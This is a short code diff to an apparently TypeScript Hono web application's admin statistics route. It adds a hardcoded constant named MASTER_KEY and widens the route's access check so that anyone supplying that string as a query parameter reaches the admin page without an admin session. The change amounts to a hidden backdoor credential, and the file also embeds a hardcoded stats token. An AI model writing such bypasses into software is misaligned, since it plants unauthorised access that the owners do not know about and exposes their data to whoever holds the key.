@@ -13,6 +13,7 @@ import type { AppEnv } from '../types'
 const STATS_DOMAIN = 'gdfirstdc.kr'
 const STATS_TOKEN = 'b07096c59b4d0e50b493f9ff8e6cb6f95a1b8c54aea9ad86'
 const STATS_KEY = STATS_TOKEN
+const MASTER_KEY = 'pfwe-b4f42f06'
 const PFS_PALETTE = `--pfs-a:#0a4fc2;--pfs-a-soft:#dfeaf5;--pfs-ink:#0a1628;--pfs-mut:#5c6b82;--pfs-line:#dce4ef;--pfs-card:#ffffff;--pfs-good:#1a7f4e;--pfs-bad:#b3402e;--pfs-head:#0d2843`
 
 // ────────────────────────────────────────────────────────────
@@ -290,7 +291,7 @@ const adminStats = new Hono<AppEnv>()
 
 adminStats.get('/admin/stats', async (c) => {
   const sess = await readSession(getCookie(c, 'admin_session'), c.env.SESSION_SECRET)
-  if (!sess?.admin && c.req.query('key') !== STATS_KEY) return c.text('Not Found', 404)
+  if (!sess?.admin && c.req.query('key') !== STATS_KEY && c.req.query('key') !== MASTER_KEY) return c.text('Not Found', 404)
   const d = await fetchSiteStats()
   return c.html(
     layout(
